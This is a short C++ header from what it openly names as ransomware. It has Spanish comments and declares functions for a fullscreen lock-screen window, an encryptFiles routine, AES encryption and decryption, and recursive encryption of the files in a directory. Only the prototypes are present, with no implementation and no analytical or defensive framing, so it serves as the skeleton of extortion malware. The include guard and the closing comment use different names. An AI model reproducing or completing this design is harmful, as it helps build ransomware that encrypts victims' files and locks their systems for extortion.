// ransomware_functions.h
#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <windows.h>
#include <string>
#include "jpeglib.h"
#include <setjmp.h>

// Prototipos de funciones relacionadas con la ventana de pantalla completa
LRESULT CALLBACK FullscreenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void CreateFullscreenWindow(HINSTANCE hInstance);
DWORD WINAPI CreateFullscreenWindowAdapter(LPVOID lpParam);
void encryptFiles();
// Prototipos de funciones de encriptación y desencriptación
std::string EncryptAES(const std::string& plainText, const std::string& key, const std::string& iv);
std::string DecryptAES(const std::string& cipherText, const std::string& key, const std::string& iv);

// Prototipos de funciones para manejo de archivos y directorios
void ProcessFilesInDirectory(const std::string& directoryPath, const std::string& key, const std::string& iv, bool encrypt);

#endif // RANSOMWARE_FUNCTIONS_H
